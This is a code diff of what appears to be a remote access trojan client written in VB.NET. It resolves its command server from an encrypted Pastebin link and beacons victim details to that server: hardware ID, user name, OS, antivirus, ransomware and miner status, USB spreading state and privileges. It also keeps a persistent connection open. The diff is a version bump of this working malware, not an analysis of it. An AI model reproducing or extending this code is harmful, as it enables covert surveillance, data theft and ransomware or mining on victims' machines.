@@ -89,12 +89,14 @@ re:
                 C.SendTimeout = -1
 
 #If DEBUG Then
+
                 C_Settings.HOST = "127.0.0.1"
                 C_Settings.PORT = 8989
 #Else
-
                 Using WC As New Net.WebClient 'Pastebin, split by ":" IP:PORT
                     Try
+                        Dim myCredentials As New Net.NetworkCredential("", "")
+                        WC.Credentials = myCredentials
                         Dim Response As String = WC.DownloadString(C_Encryption.AES_Decrypt(C_Settings.Pastebin))
                         C_Settings.HOST = Response.Split(":")(0)
                         C_Settings.PORT = Response.Split(":")(1)
@@ -108,12 +110,12 @@ re:
                 Alive = True
                 MS = New IO.MemoryStream
 
-                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.4B", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
-                                  C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, "...", SPL, " ", SPL,
+                Send(String.Concat("info", SPL, C_ID.HWID, SPL, C_ID.UserName, SPL, "v0.1.8.5B", SPL, C_ID.MyOS, " ", C_ID.Bit, SPL,
+                                  C_ID.INDATE, SPL, C_ID.AV, SPL, C_ID.Rans, SPL, C_ID.XMR, SPL, C_ID.USBSP, SPL, C_Settings.PORT, SPL, C_ID.dotNET, SPL, "...", SPL, " ", SPL,
                                   C_ID.Privileges.ToString, SPL, C_Settings.fullpath))
 
-                Dim T As New System.Threading.TimerCallback(AddressOf PING)
-                Tick = New System.Threading.Timer(T, Nothing, 0, 1)
+                Dim T As New Threading.TimerCallback(AddressOf PING)
+                Tick = New Threading.Timer(T, Nothing, 0, 1)
 
                 Return Alive
             Catch ex As Exception
@@ -156,7 +158,7 @@ re:
                     End If
                 End If
 
-                KAP += 1 : If KAP > 3000 Then KAP = 0 : Send("KA")
+                KAP += 1 : If KAP > 5000 Then KAP = 0 : Send("KA")
             Catch : End Try
         End Sub
 
